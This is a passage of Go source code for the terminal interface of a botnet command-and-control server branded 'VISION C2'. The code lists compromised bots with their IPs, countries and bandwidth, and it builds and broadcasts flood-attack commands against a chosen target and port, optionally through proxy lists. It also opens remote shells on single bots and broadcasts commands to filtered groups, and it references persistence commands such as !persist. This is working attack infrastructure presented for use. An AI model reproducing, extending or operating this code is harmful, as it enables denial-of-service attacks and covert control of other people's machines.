			m.selectedBot = ""
			m.broadcastTab = 0
			m.shortcutCursor = 0
		case 3: // Socks Manager
			m.currentView = ViewSocks
			m.socksInputMode = false
			m.refreshBotList() // Refresh bot list for socks view
		case 4: // Help
			m.currentView = ViewHelp
		case 5: // Exit
			m.quitting = true
			return m, tea.Quit
		}
	case ViewAttack:
		if m.attackCursor == 3 { // Method field selected
			m.currentView = ViewMethodSelect
		} else if m.attackCursor == 4 && isL7Method(m.attackCmd) {
			// Proxy URL field - start text input
			m.attackInputActive = true
		} else if m.attackCursor < 3 {
			// Start text input for target/port/duration
			m.attackInputActive = true
		}
	case ViewMethodSelect:
		// Select the method and go back to attack form
		m.attackMethod = attackMethods[m.methodCursor].name
		m.attackCmd = attackMethods[m.methodCursor].cmd
		m.currentView = ViewAttack
	case ViewBotList:
		// Open remote shell for selected bot
		if len(m.bots) > 0 && m.botCursor < len(m.bots) {
			m.selectedBot = m.bots[m.botCursor].ID
			m.selectedBotArch = m.bots[m.botCursor].Arch
			m.shellOutput = []string{}
			m.shellInput = ""
			m.shellHistory = []string{}
			m.historyCursor = 0
			m.shellScrollOffset = 0
			m.remoteShellTab = 0
			m.remoteShortcutCur = 0
			m.currentView = ViewRemoteShell
		}
	}
	return m, nil
}

func (m *TUIModel) refreshBotList() {
	m.bots = []BotInfo{}
	botConnsLock.RLock()
	defer botConnsLock.RUnlock()
	for id, bot := range botConnections {
		if bot.authenticated {
			m.bots = append(m.bots, BotInfo{
				ID:          id,
				Arch:        bot.arch,
				IP:          bot.ip,
				RAM:         bot.ram,
				CPU:         bot.cpuCores,
				Uptime:      time.Since(bot.connectedAt),
				ProcessName: bot.processName,
				UplinkMbps:  bot.uplinkMbps,
				Country:     bot.country,
			})
		}
	}
}

// launchAttack sends the attack command to all bots
func (m TUIModel) launchAttack() (tea.Model, tea.Cmd) {
	// Validate fields
	if m.attackTarget == "" {
		m.errorMessage = "Target required"
		return m, nil
	}
	if m.attackPort == "" {
		m.attackPort = "80"
	}
	if m.attackDuration == "" {
		m.attackDuration = "30"
	}
	if m.attackCmd == "" {
		m.errorMessage = "Select attack method"
		return m, nil
	}

	// Parse duration
	durSec, err := strconv.Atoi(m.attackDuration)
	if err != nil {
		durSec = 30
	}
	dur := time.Duration(durSec) * time.Second

	// Build command - include proxy URL if L7 method and URL provided
	var cmd string
	if isL7Method(m.attackCmd) && m.attackProxyURL != "" {
		cmd = fmt.Sprintf("%s %s %s %s -pu %s", m.attackCmd, m.attackTarget, m.attackPort, m.attackDuration, m.attackProxyURL)
	} else {
		cmd = fmt.Sprintf("%s %s %s %s", m.attackCmd, m.attackTarget, m.attackPort, m.attackDuration)
	}

	// Send to all bots
	sendToBots(cmd)

	// Track the attack in TUI attacks list
	tuiAttackIDSeq++
	newAttack := TUIAttack{
		ID:       tuiAttackIDSeq,
		Method:   m.attackMethod,
		Target:   m.attackTarget,
		Port:     m.attackPort,
		Duration: dur,
		Start:    time.Now(),
	}
	tuiAttacks = append(tuiAttacks, newAttack)

	// Start cleanup goroutine for this attack
	go func(attackID int, duration time.Duration) {
		time.Sleep(duration)
		// Remove attack from list
		for i, a := range tuiAttacks {
			if a.ID == attackID {
				tuiAttacks = append(tuiAttacks[:i], tuiAttacks[i+1:]...)
				break
			}
		}
	}(newAttack.ID, dur)

	// Start launch animation instead of just showing toast
	m.launchAnimating = true
	m.launchAnimStage = 0
	m.launchAnimStart = time.Now()
	m.launchAnimMethod = m.attackMethod
	m.launchAnimTarget = m.attackTarget
	m.launchAnimPort = m.attackPort
	m.launchAnimDur = m.attackDuration

	m.statusMessage = ""
	m.errorMessage = ""
	m.attackCount++

	// Reset attack fields to defaults
	m.attackTarget = ""
	m.attackPort = "80"
	m.attackDuration = "60"
	m.attackMethod = ""
	m.attackCmd = ""
	m.attackProxyURL = ""
	m.attackCursor = 0

	// Return with a tick command to animate
	return m, tea.Tick(200*time.Millisecond, func(t time.Time) tea.Msg {
		return launchAnimTickMsg{}
	})
}

// executeShellCommand sends a shell command to the selected bot or broadcasts
func (m TUIModel) executeShellCommand() (tea.Model, tea.Cmd) {
	if m.shellInput == "" {
		return m, nil
	}

	cmd := m.shellInput

	if m.currentView == ViewRemoteShell && m.selectedBot != "" {
		// Single bot — send immediately
		m.shellHistory = append(m.shellHistory, cmd)
		m.historyCursor = len(m.shellHistory)

		prompt := lipgloss.NewStyle().Foreground(lipgloss.Color("46")).Render("$")
		m.shellOutput = append(m.shellOutput, prompt+" "+cmd)

		// Bot commands (e.g. !persist, !reinstall, !lolnogtfo) are sent
		// directly; plain OS commands get wrapped with !shell.
		fullCmd := cmd
		if !strings.HasPrefix(cmd, "!") {
			fullCmd = fmt.Sprintf("!shell %s", cmd)
		}
		sendToSingleBot(m.selectedBot, fullCmd)
		m.shellInput = ""
		m.shellScrollOffset = 0 // Snap to bottom to see command output
		return m, nil
	}

	if m.currentView == ViewBroadcastShell {
		// Broadcast — require confirmation first
		m.pendingBroadcastCmd = cmd
		m.confirmBroadcast = true
		m.shellInput = ""
		return m, nil
	}

	m.shellInput = ""
	return m, nil
}

// executeBroadcastConfirmed actually sends the pending broadcast command after confirmation
func (m TUIModel) executeBroadcastConfirmed() (tea.Model, tea.Cmd) {
	cmd := m.pendingBroadcastCmd
	m.confirmBroadcast = false
	m.pendingBroadcastCmd = ""

	if cmd == "" {
		return m, nil
	}

	// Add to history
	m.shellHistory = append(m.shellHistory, cmd)
	m.historyCursor = len(m.shellHistory)

	// Build the actual command
	var fullCmd string
	if strings.HasPrefix(cmd, "!") {
		fullCmd = cmd
	} else {
		fullCmd = fmt.Sprintf("!detach %s", cmd)
	}
	sentCount := sendToFilteredBots(fullCmd, m.broadcastArch, m.broadcastMinRAM, m.broadcastMaxBots)

	// Toast notification
	neonGreen := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
	neonCyan := lipgloss.NewStyle().Foreground(lipgloss.Color("51"))
	m.toastMessage = neonGreen.Render("📡") + " " +
		neonCyan.Render(cmd) + " " +
		neonGreen.Render(fmt.Sprintf("→ %d bots", sentCount))
	m.toastExpiry = time.Now().Add(3 * time.Second)

	return m, nil
}

// View renders the current view
func (m TUIModel) View() string {
	if m.quitting {
		return "\n  " + subtitleStyle.Render("Goodbye from VISION C2") + "\n\n"
	}

	var content string
	switch m.currentView {
	case ViewDashboard:
		content = m.viewDashboard()
	case ViewBotList:
		content = m.viewBotList()
	case ViewAttack:
		content = m.viewAttack()
	case ViewMethodSelect:
		content = m.viewMethodSelect()
	case ViewSocks:
		content = m.viewSocks()
	case ViewHelp:
		content = m.viewHelp()
	case ViewRemoteShell:
		content = m.viewRemoteShell()
	case ViewBroadcastShell:
		content = m.viewBroadcastShell()
	default:
		content = m.viewDashboard()
	}

	// Get terminal dimensions
	width := m.width
	height := m.height
	if width == 0 {
		width = 120
	}
	if height == 0 {
		height = 40
	}

	// Render status bar
	statusBar := m.renderStatusBar()

	// Calculate status bar height (1 line base + 1 if toast active)
	statusBarHeight := 1
	if m.toastMessage != "" && time.Now().Before(m.toastExpiry) {
		statusBarHeight = 2
	}

	// Count content lines
	contentLines := strings.Count(content, "\n") + 1

	// Calculate padding needed to push status bar to bottom
	availableHeight := height - statusBarHeight
	paddingLines := availableHeight - contentLines
	if paddingLines < 0 {
		paddingLines = 0
	}

	// Build final output with content, padding, and footer locked to bottom
	padding := strings.Repeat("\n", paddingLines)

	return content + padding + statusBar
}

func (m TUIModel) viewDashboard() string {
	var b strings.Builder

	// ASCII Banner with gradient effect
	bannerLines := []string{
		"",
		"",

		" ____   ____.__       .__                ________  ________  ",
		" \\   \\ /   /|__| _____|__| ____   ____   \\_   ___ \\ \\_____  \\ ",
		"  \\   Y   / |  |/  ___/  |/  _ \\ /    \\  /    \\  \\/  /  ____/ ",
		"   \\     /  |  |\\___ \\|  (  <_> )   |  \\ \\     \\____/       \\ ",
		"    \\___/   |__/____  >__|\\____/|___|  /  \\______  /\\_______ \\",
		"                    \\/               \\/          \\/         \\/",
		" ═══════════════════════════════════════════════════════════════",
		"     ☾℣☽  B O T N E T   C O M M A N D   &   C O N T R O L  ☾℣☽   ",
		" ═══════════════════════════════════════════════════════════════",
		"",
	}
	// Gradient colors from purple to cyan
	gradientColors := []string{
		"93",  // Purple
		"99",  // Purple-blue
		"105", // Blue-purple
		"111", // Light blue
		"117", // Cyan-blue
		"123", // Light cyan
		"159", // Pale cyan
		"195", // Very light cyan
		"51",  // Cyan
		"50",  // Cyan-green
		"49",  // Teal
	}

	b.WriteString("\n")
	for i, line := range bannerLines {
		colorIdx := i
		if colorIdx >= len(gradientColors) {
			colorIdx = len(gradientColors) - 1
		}
		style := lipgloss.NewStyle().Foreground(lipgloss.Color(gradientColors[colorIdx]))
		b.WriteString(style.Render(line) + "\n")
	}

	// Compact stats bar right under banner
	statsBar := m.renderStatsBar()
	b.WriteString(statsBar)
	b.WriteString("\n\n")

	// Video game style menu
	neonCyan := lipgloss.NewStyle().Foreground(lipgloss.Color("51"))
	neonPink := lipgloss.NewStyle().Foreground(lipgloss.Color("201"))
	dim := lipgloss.NewStyle().Foreground(lipgloss.Color("240"))

	// Menu box
	menuWidth := 40
	b.WriteString(neonCyan.Render("    ╔"+strings.Repeat("═", menuWidth)+"╗") + "\n")
	b.WriteString(neonCyan.Render("    ║") + neonPink.Bold(true).Render(centerText("MAIN MENU", menuWidth)) + neonCyan.Render("║") + "\n")
	b.WriteString(neonCyan.Render("    ╠"+strings.Repeat("═", menuWidth)+"╣") + "\n")

	for i, item := range m.menuItems {
		if i == m.menuCursor {
			// Selected item with highlight bar
			selector := neonPink.Bold(true).Render(" ► ")
			itemText := lipgloss.NewStyle().
				Foreground(lipgloss.Color("51")).
				Background(lipgloss.Color("236")).
				Bold(true).
				Render(padRight(item, menuWidth-4))
			b.WriteString(neonCyan.Render("    ║") + selector + itemText + neonCyan.Render(" ║") + "\n")
		} else {
			// Unselected item
			b.WriteString(neonCyan.Render("    ║") + "    " + dim.Render(padRight(item, menuWidth-4)) + neonCyan.Render("║") + "\n")
		}
	}

	b.WriteString(neonCyan.Render("    ╠"+strings.Repeat("═", menuWidth)+"╣") + "\n")
	b.WriteString(neonCyan.Render("    ║") + dim.Render(centerText("[↑/↓] Navigate  [Enter] Select", menuWidth)) + "    " + neonCyan.Render("║") + "\n")
	b.WriteString(neonCyan.Render("    ╚"+strings.Repeat("═", menuWidth)+"╝") + "\n")

	return b.String()
}

// Helper function to center text within a given width
func centerText(text string, width int) string {
	if len(text) >= width {
		return text[:width]
	}
	padding := (width - len(text)) / 2
	return strings.Repeat(" ", padding) + text + strings.Repeat(" ", width-len(text)-padding)
}

// Helper function to pad text to the right
func padRight(text string, width int) string {
	if len(text) >= width {
		return text[:width]
	}
	return text + strings.Repeat(" ", width-len(text))
}

// DEMO MODE: Set to true to mask real IPs with random ones this is something I use for my own opsec during recording gifs for the docs
var demoMode = false

// Generate a deterministic random IP based on the real IP (so it stays consistent)
func maskIP(realIP string) string {
	if !demoMode {
		return realIP
	}
	// Use hash of real IP to generate consistent fake IP
	hash := 0
	for _, c := range realIP {
		hash = hash*31 + int(c)
	}
	if hash < 0 {
		hash = -hash
	}
	return fmt.Sprintf("%d.%d.%d.%d",
		(hash%200)+10,
		((hash/256)%200)+10,
		((hash/65536)%200)+10,
		((hash/16777216)%200)+10)
}

func (m TUIModel) renderStatsBar() string {
	// Styles
	dim := lipgloss.NewStyle().Foreground(lipgloss.Color("240"))
	cyan := lipgloss.NewStyle().Foreground(lipgloss.Color("51"))
	green := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
	orange := lipgloss.NewStyle().Foreground(lipgloss.Color("214"))
	pink := lipgloss.NewStyle().Foreground(lipgloss.Color("201"))

	status := green.Render("● ONLINE")
	if m.botCount == 0 {
		status = lipgloss.NewStyle().Foreground(lipgloss.Color("196")).Render("○ NO BOTS")
	}

	ramStr := formatRAM(m.totalRAM)
	uptime := getC2Uptime()

	// Build compact single-line stats bar
	bar := fmt.Sprintf("  %s %s  %s %s  %s %s  %s %s  %s %s  %s %s",
		dim.Render("Status:"), status,
		dim.Render("│ Bots:"), green.Render(fmt.Sprintf("%d", m.botCount)),
		dim.Render("│ RAM:"), cyan.Render(ramStr),
		dim.Render("│ CPU:"), pink.Render(fmt.Sprintf("%d cores", m.totalCPU)),
		dim.Render("│ Uptime:"), orange.Render(uptime),
		dim.Render("│ TLS:"), green.Render("1.3"))

	return bar
}

func (m TUIModel) viewBotList() string {
	var b strings.Builder

	b.WriteString(headerStyle.Render("  CONNECTED BOTS"))
	b.WriteString("\n\n")

	if len(m.bots) == 0 {
		b.WriteString(subtitleStyle.Render("  No bots connected"))
		b.WriteString("\n")
	} else {
		// Table header
		colDim := lipgloss.NewStyle().Foreground(lipgloss.Color("240"))
		header := fmt.Sprintf("  %-12s %-4s %-14s %-16s %-8s %-5s %-12s %-10s %-10s",
			"ID", "GEO", "ARCH", "IP", "RAM", "CPU", "PROCESS", "UPLINK", "UPTIME")
		b.WriteString(colDim.Render(header))
		b.WriteString("\n")
		b.WriteString(colDim.Render("  " + strings.Repeat("─", 96)))
		b.WriteString("\n")

		// Country flag styling
		geoStyle := lipgloss.NewStyle().Foreground(lipgloss.Color("226")).Bold(true)
		procStyle := lipgloss.NewStyle().Foreground(lipgloss.Color("135"))
		uplinkStyle := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))

		for i, bot := range m.bots {
			cursor := "  "
			style := botItemStyle
			if i == m.botCursor {
				cursor = "▸ "
				style = botSelectedStyle
			}

			uptime := formatDuration(bot.Uptime)
			cpuStr := fmt.Sprintf("%d", bot.CPU)
			uplinkStr := fmt.Sprintf("%.1fM", bot.UplinkMbps)
			if bot.UplinkMbps >= 1000 {
				uplinkStr = fmt.Sprintf("%.1fG", bot.UplinkMbps/1000)
			}
			country := bot.Country
			if country == "" {
				country = "??"
			}
			procName := bot.ProcessName
			if procName == "" {
				procName = "unknown"
			}

			// Pad text BEFORE applying styles to avoid ANSI codes breaking alignment
			line := style.Render(fmt.Sprintf("%-12s", truncate(bot.ID, 10))) + " " +
				geoStyle.Render(fmt.Sprintf("%-4s", country)) + " " +
				style.Render(fmt.Sprintf("%-14s", bot.Arch)) + " " +
				style.Render(fmt.Sprintf("%-16s", maskIP(bot.IP))) + " " +
				style.Render(fmt.Sprintf("%-8s", formatRAM(bot.RAM))) + " " +
				style.Render(fmt.Sprintf("%-5s", cpuStr)) + " " +
				procStyle.Render(fmt.Sprintf("%-12s", truncate(procName, 10))) + " " +
				uplinkStyle.Render(fmt.Sprintf("%-10s", uplinkStr)) + " " +
				style.Render(fmt.Sprintf("%-10s", uptime))

			b.WriteString(fmt.Sprintf("%s%s\n", cursor, line))
		}
	}

	b.WriteString("\n")
	b.WriteString(subtitleStyle.Render("  [q] Back  [r] Refresh  [enter] Select"))
	b.WriteString("\n")

	return b.String()
}

func (m TUIModel) viewAttack() string {
	var b strings.Builder

	neonCyan := lipgloss.NewStyle().Foreground(lipgloss.Color("51"))
	neonPink := lipgloss.NewStyle().Foreground(lipgloss.Color("201"))
	neonGreen := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
	neonYellow := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
	neonRed := lipgloss.NewStyle().Foreground(lipgloss.Color("196"))
	neonOrange := lipgloss.NewStyle().Foreground(lipgloss.Color("208"))
	neonPurple := lipgloss.NewStyle().Foreground(lipgloss.Color("135"))
	dim := lipgloss.NewStyle().Foreground(lipgloss.Color("240"))
	white := lipgloss.NewStyle().Foreground(lipgloss.Color("231"))
	darkGray := lipgloss.NewStyle().Foreground(lipgloss.Color("236"))

	// Cyberpunk box characters
	boxTL := "╔"
	boxTR := "╗"
	boxBL := "╚"
	boxBR := "╝"
	boxH := "═"
	boxV := "║"
	boxML := "╠"
	boxMR := "╣"

	// Show launch animation if active
	if m.launchAnimating {
		b.WriteString("\n")

		// Glitch effect characters
		glitchChars := []string{"░", "▒", "▓", "█", "▄", "▀", "■"}
		glitch := func() string {
			return glitchChars[m.launchAnimStage%len(glitchChars)]
		}

		// Animation frames with cyberpunk flair
		frames := []string{
			"  ◈ INITIALIZING ATTACK VECTORS...",
			"  ◈◈ ACQUIRING TARGET: " + m.launchAnimTarget,
			"  ◈◈◈ LOADING " + m.launchAnimMethod + " MODULE...",
			"  ◈◈◈◈ DEPLOYING " + fmt.Sprintf("%d", m.botCount) + " NODES...",
			"  ◈◈◈◈◈ SYNCHRONIZING PAYLOADS...",
			"  ▶ ATTACK SEQUENCE INITIATED",
			"  ▶▶ SWARM ACTIVE",
			"  ✓ OPERATION RUNNING",
		}

		// Cool loading bar with gradient effect
		barWidth := 44
		filled := (m.launchAnimStage + 1) * (barWidth / 8)
		if filled > barWidth {
			filled = barWidth
		}

		// Gradient bar
		var loadBar string
		for i := 0; i < barWidth; i++ {
			if i < filled {
				if i < filled/3 {
					loadBar += neonPurple.Render("█")
				} else if i < filled*2/3 {
					loadBar += neonPink.Render("█")
				} else {
					loadBar += neonCyan.Render("█")
				}
			} else {
				loadBar += darkGray.Render("░")
			}
		}

		// Cyberpunk animated border
		borderColor := neonPink
		if m.launchAnimStage >= 5 {
			borderColor = neonGreen
		}

		width := 52
		b.WriteString(borderColor.Bold(true).Render("  "+boxTL+strings.Repeat(boxH, width)+boxTR) + "\n")
		b.WriteString(borderColor.Bold(true).Render("  " + boxV))

		// Title with glitch effect
		if m.launchAnimStage >= 5 {
			title := "  ◆ ATTACK SEQUENCE ACTIVE ◆  "
			padding := (width - len(title)) / 2
			b.WriteString(strings.Repeat(" ", padding))
			b.WriteString(neonGreen.Bold(true).Render(title))
			b.WriteString(strings.Repeat(" ", width-padding-len(title)))
		} else {
			title := fmt.Sprintf("  %s INITIATING STRIKE %s  ", glitch(), glitch())
			padding := (width - len(title)) / 2
			b.WriteString(strings.Repeat(" ", padding))
			b.WriteString(neonCyan.Bold(true).Render(title))
			b.WriteString(strings.Repeat(" ", width-padding-len(title)))
		}
		b.WriteString(borderColor.Bold(true).Render(boxV) + "\n")

		b.WriteString(borderColor.Bold(true).Render("  "+boxML+strings.Repeat(boxH, width)+boxMR) + "\n")

		// Status line
		b.WriteString(borderColor.Bold(true).Render("  " + boxV))
		b.WriteString("  ")
		if m.launchAnimStage < len(frames) {
			if m.launchAnimStage >= 5 {
				b.WriteString(neonGreen.Bold(true).Render(fmt.Sprintf("%-50s", frames[m.launchAnimStage])))
			} else {
				b.WriteString(neonOrange.Render(fmt.Sprintf("%-50s", frames[m.launchAnimStage])))
			}
		}
		b.WriteString(borderColor.Bold(true).Render(boxV) + "\n")

		// Progress bar
		b.WriteString(borderColor.Bold(true).Render("  " + boxV))
		b.WriteString("  [")
		if m.launchAnimStage >= 5 {
			b.WriteString(neonGreen.Render(strings.Repeat("█", barWidth)))
		} else {
			b.WriteString(loadBar)
		}
		b.WriteString("] ")
		pct := (m.launchAnimStage + 1) * 100 / 8
		if pct > 100 {
			pct = 100
		}
		b.WriteString(neonCyan.Render(fmt.Sprintf("%3d%%", pct)))
		b.WriteString(borderColor.Bold(true).Render(boxV) + "\n")

		b.WriteString(borderColor.Bold(true).Render("  "+boxML+strings.Repeat(boxH, width)+boxMR) + "\n")

		// Target info with icons
		b.WriteString(borderColor.Bold(true).Render("  " + boxV))
		b.WriteString(fmt.Sprintf("  %s %s  %s %s  %s %s",
			neonPurple.Render("◈ METHOD:"), neonCyan.Bold(true).Render(m.launchAnimMethod),
			neonPurple.Render("◈ TARGET:"), neonYellow.Bold(true).Render(m.launchAnimTarget+":"+m.launchAnimPort),
			neonPurple.Render("◈ TIME:"), neonGreen.Bold(true).Render(m.launchAnimDur+"s")))
		infoLen := len("  ◈ METHOD: " + m.launchAnimMethod + "  ◈ TARGET: " + m.launchAnimTarget + ":" + m.launchAnimPort + "  ◈ TIME: " + m.launchAnimDur + "s")
		if infoLen < width {
			b.WriteString(strings.Repeat(" ", width-infoLen))
		}
		b.WriteString(borderColor.Bold(true).Render(boxV) + "\n")

		b.WriteString(borderColor.Bold(true).Render("  "+boxBL+strings.Repeat(boxH, width)+boxBR) + "\n")

		return b.String()
	}

	// ═══════════════════════════════════════════════════════════════════════
	// CYBERPUNK ATTACK CENTER HEADER
	// ═══════════════════════════════════════════════════════════════════════

	// Purple gradient colors matching main banner
	gradientColors := []lipgloss.Style{
		lipgloss.NewStyle().Foreground(lipgloss.Color("93")),  // Purple1 - darkest
		lipgloss.NewStyle().Foreground(lipgloss.Color("99")),  // Purple2
		lipgloss.NewStyle().Foreground(lipgloss.Color("105")), // Purple3
		lipgloss.NewStyle().Foreground(lipgloss.Color("111")), // Purple4
		lipgloss.NewStyle().Foreground(lipgloss.Color("117")), // Purple5
		lipgloss.NewStyle().Foreground(lipgloss.Color("123")), // Purple6
		lipgloss.NewStyle().Foreground(lipgloss.Color("159")), // Purple7
		lipgloss.NewStyle().Foreground(lipgloss.Color("195")), // Purple8 - lightest
		lipgloss.NewStyle().Foreground(lipgloss.Color("159")), // Purple7 (reverse gradient)
		lipgloss.NewStyle().Foreground(lipgloss.Color("117")), // Purple5
	}

	// ASCII art header with gradient
	b.WriteString("\n")
	headerArt := []string{
		"  ______     __      __                          __                 ",
		" /       |  /  |    /  |                        /  |                ",
		"/$$$$$$  | _$$ |_  _$$ |_     ______    _______ $$ |   __   _______ ",
		"$$ |__$$ |/ $$   |/ $$   |   /      |  /       |$$ |  /  | /       |",
		"$$    $$ |$$$$$$/ $$$$$$/    $$$$$$  |/$$$$$$$/ $$ |_/$$/ /$$$$$$$/ ",
		"$$$$$$$$ |  $$ | __ $$ | __  /    $$ |$$ |      $$   $$<  $$      $ ",
		"$$ |  $$ |  $$ |/  |$$ |/  |/$$$$$$$ |$$ |______ $$$$$$    $$$$$$  |",
		"$$ |  $$ |  $$  $$/ $$  $$/ $$    $$ |$$       |$$ | $$  |/     $$/ ",
		"$$/   $$/    $$$$/   $$$$/   $$$$$$$/  $$$$$$$/ $$/   $$/ $$$$$$$/  ",
		" ═══════════════════════════════════════════════════════════════",
		"     			☾℣☽  INTERACTIVE ATTACK BUILDER  ☾℣☽   ",
		" ═══════════════════════════════════════════════════════════════",
	}
	for i, line := range headerArt {
		colorIdx := i
		if colorIdx >= len(gradientColors) {
			colorIdx = len(gradientColors) - 1
		}
		b.WriteString(gradientColors[colorIdx].Bold(true).Render(line) + "\n")
	}

	// Count ongoing attacks from both sources
	ongoingCount := 0
	ongoingAttacksLock.RLock()
	for _, attack := range ongoingAttacks {
		if time.Until(attack.start.Add(attack.duration)) > 0 {
			ongoingCount++
		}
	}
	ongoingAttacksLock.RUnlock()
	for _, attack := range tuiAttacks {
		if time.Until(attack.Start.Add(attack.Duration)) > 0 {
			ongoingCount++
		}
	}

	// Tab bar with cyberpunk styling
	b.WriteString("\n    ")
	if m.attackViewMode == 0 {
		b.WriteString(neonPink.Bold(true).Render("┌──────────────┐"))
		b.WriteString(dim.Render("┌────────────────────┐"))
	} else {
		b.WriteString(dim.Render("┌──────────────┐"))
		b.WriteString(neonPink.Bold(true).Render("┌────────────────────┐"))
	}
	b.WriteString("\n    ")
	if m.attackViewMode == 0 {
		b.WriteString(neonPink.Bold(true).Render("│"))
		b.WriteString(neonCyan.Bold(true).Render(" ⚡ LAUNCH    "))
		b.WriteString(neonPink.Bold(true).Render("│"))
		b.WriteString(dim.Render("│"))
		if ongoingCount > 0 {
			b.WriteString(neonYellow.Render(fmt.Sprintf(" 📡 ACTIVE [%d]    ", ongoingCount)))
		} else {
			b.WriteString(dim.Render(" 📡 ACTIVE [0]    "))
		}
		b.WriteString(dim.Render("│"))
	} else {
		b.WriteString(dim.Render("│ ⚡ LAUNCH    │"))
		b.WriteString(neonPink.Bold(true).Render("│"))
		if ongoingCount > 0 {
			b.WriteString(neonYellow.Bold(true).Render(fmt.Sprintf(" 📡 ACTIVE [%d]    ", ongoingCount)))
		} else {
			b.WriteString(neonCyan.Bold(true).Render(" 📡 ACTIVE [0]    "))
		}
		b.WriteString(neonPink.Bold(true).Render("│"))
	}
	b.WriteString("\n    ")
	if m.attackViewMode == 0 {
		b.WriteString(neonPink.Bold(true).Render("└──────────────┘"))
		b.WriteString(dim.Render("└────────────────────┘"))
	} else {
		b.WriteString(dim.Render("└──────────────┘"))
		b.WriteString(neonPink.Bold(true).Render("└────────────────────┘"))
	}
	b.WriteString("\n\n")

	if m.attackViewMode == 0 {
		// ═══════════════════════════════════════════════════════════════════════
		// LAUNCH TAB - Cyberpunk Form
		// ═══════════════════════════════════════════════════════════════════════

		methodDisplay := m.attackMethod
		if methodDisplay == "" {
			methodDisplay = "[ SELECT ]"
		}

		// Form fields with cyberpunk styling
		fields := []struct {
			icon  string
			label string
			value string
			hint  string
		}{
			{"◈", "TARGET", m.attackTarget, "IP address or hostname"},
			{"◈", "PORT", m.attackPort, "Target port (default: 80)"},
			{"◈", "DURATION", m.attackDuration, "Attack duration in seconds"},
			{"◆", "METHOD", methodDisplay, "Press ENTER to select attack type"},
		}

		// Add proxy URL field only for L7 methods
		if isL7Method(m.attackCmd) {
			proxyHint := "URL to proxy list file"
			if m.attackProxyURL == "" {
				proxyHint = "Optional - leave blank for direct"
			}
			fields = append(fields, struct {
				icon  string
				label string
				value string
				hint  string
			}{"◇", "PROXY URL", m.attackProxyURL, proxyHint})
		}

		// Form box
		b.WriteString(neonPurple.Render("    ┌─────────────────────────────────────────────────────┐") + "\n")
		b.WriteString(neonPurple.Render("    │") + neonCyan.Bold(true).Render("           ◆ CONFIGURE ATTACK PARAMETERS ◆           ") + neonPurple.Render("│") + "\n")
		b.WriteString(neonPurple.Render("    ├─────────────────────────────────────────────────────┤") + "\n")

		for i, field := range fields {
			isSelected := i == m.attackCursor
			isEditing := m.attackInputActive && isSelected

			// Line start
			b.WriteString(neonPurple.Render("    │ "))

			// Cursor/icon
			if isSelected {
				b.WriteString(neonPink.Bold(true).Render("▶ " + field.icon + " "))
			} else {
				b.WriteString(dim.Render("  " + field.icon + " "))
			}

			// Label
			labelStyle := dim
			if isSelected {
				labelStyle = neonCyan.Bold(true)
			}
			b.WriteString(labelStyle.Render(fmt.Sprintf("%-10s", field.label)))
			b.WriteString(dim.Render(": "))

			// Value
			displayValue := field.value
			if displayValue == "" {
				displayValue = "_______________"
			}
			if displayValue == "[ SELECT ]" {
				if isSelected {
					b.WriteString(neonYellow.Bold(true).Render(displayValue))
				} else {
					b.WriteString(dim.Italic(true).Render(displayValue))
				}
			} else if isEditing {
				b.WriteString(neonGreen.Bold(true).Render(field.value))
				b.WriteString(neonGreen.Bold(true).Render("█"))
			} else if isSelected {
				b.WriteString(neonCyan.Bold(true).Render(displayValue))
			} else {
				b.WriteString(white.Render(displayValue))
			}

			// Padding and hint
			valueLen := len(displayValue)
			if isEditing {
				valueLen++
			}
			padding := 25 - valueLen
			if padding < 0 {
				padding = 0
			}
			b.WriteString(strings.Repeat(" ", padding))

			if isSelected && !isEditing {
				b.WriteString(dim.Italic(true).Render("← " + truncate(field.hint, 15)))
			} else {
				b.WriteString(strings.Repeat(" ", 17))
			}

			b.WriteString(neonPurple.Render(" │") + "\n")
		}

		b.WriteString(neonPurple.Render("    └─────────────────────────────────────────────────────┘") + "\n")

		// Command preview with cyberpunk box
		if m.attackMethod != "" && m.attackTarget != "" {
			port := m.attackPort
			if port == "" {
				port = "80"
			}
			dur := m.attackDuration
			if dur == "" {
				dur = "30"
			}
			var cmdPreview string
			if isL7Method(m.attackCmd) && m.attackProxyURL != "" {
				cmdPreview = fmt.Sprintf("%s %s %s %s -pu %s", m.attackCmd, m.attackTarget, port, dur, m.attackProxyURL)
			} else {
				cmdPreview = fmt.Sprintf("%s %s %s %s", m.attackCmd, m.attackTarget, port, dur)
			}
			b.WriteString("\n")
			b.WriteString(dim.Render("    ┌─ COMMAND PREVIEW ─────────────────────────────────┐") + "\n")
			b.WriteString(dim.Render("    │ "))
			b.WriteString(neonGreen.Bold(true).Render("$ " + cmdPreview))
			cmdLen := len("$ " + cmdPreview)
			if cmdLen < 51 {
				b.WriteString(strings.Repeat(" ", 51-cmdLen))
			}
			b.WriteString(dim.Render(" │") + "\n")
			b.WriteString(dim.Render("    └───────────────────────────────────────────────────┘") + "\n")
		}

		if m.errorMessage != "" {
			b.WriteString("\n")
			b.WriteString(neonRed.Bold(true).Render("    ⚠ ERROR: "+m.errorMessage) + "\n")
		}

		// Controls
		b.WriteString("\n")
		if m.attackInputActive {
			b.WriteString(neonPurple.Render("    ┌─ INPUT MODE ──────────────────────────────────────┐") + "\n")
			b.WriteString(neonPurple.Render("    │ ") + neonCyan.Render("Type value") + dim.Render(" │ ") + neonGreen.Render("[ENTER]") + dim.Render(" Confirm │ ") + neonRed.Render("[ESC]") + dim.Render(" Cancel  ") + neonPurple.Render("│") + "\n")
			b.WriteString(neonPurple.Render("    └───────────────────────────────────────────────────┘") + "\n")
		} else {
			b.WriteString(dim.Render("    ╭─────────────────────────────────────────────────────╮") + "\n")
			b.WriteString(dim.Render("    │ "))
			b.WriteString(neonGreen.Render("[ENTER]") + dim.Render(" Edit  "))
			b.WriteString(neonPink.Bold(true).Render("[L]") + dim.Render(" LAUNCH  "))
			b.WriteString(neonCyan.Render("[→]") + dim.Render(" Ongoing  "))
			b.WriteString(neonYellow.Render("[Q]") + dim.Render(" Back   "))
			b.WriteString(dim.Render("│") + "\n")
			b.WriteString(dim.Render("    ╰─────────────────────────────────────────────────────╯") + "\n")
		}

	} else {
		// ═══════════════════════════════════════════════════════════════════════
		// ONGOING TAB - Cyberpunk Attack Monitor
		// ═══════════════════════════════════════════════════════════════════════

		if ongoingCount == 0 {
			b.WriteString(neonPurple.Render("    ┌─────────────────────────────────────────────────────┐") + "\n")
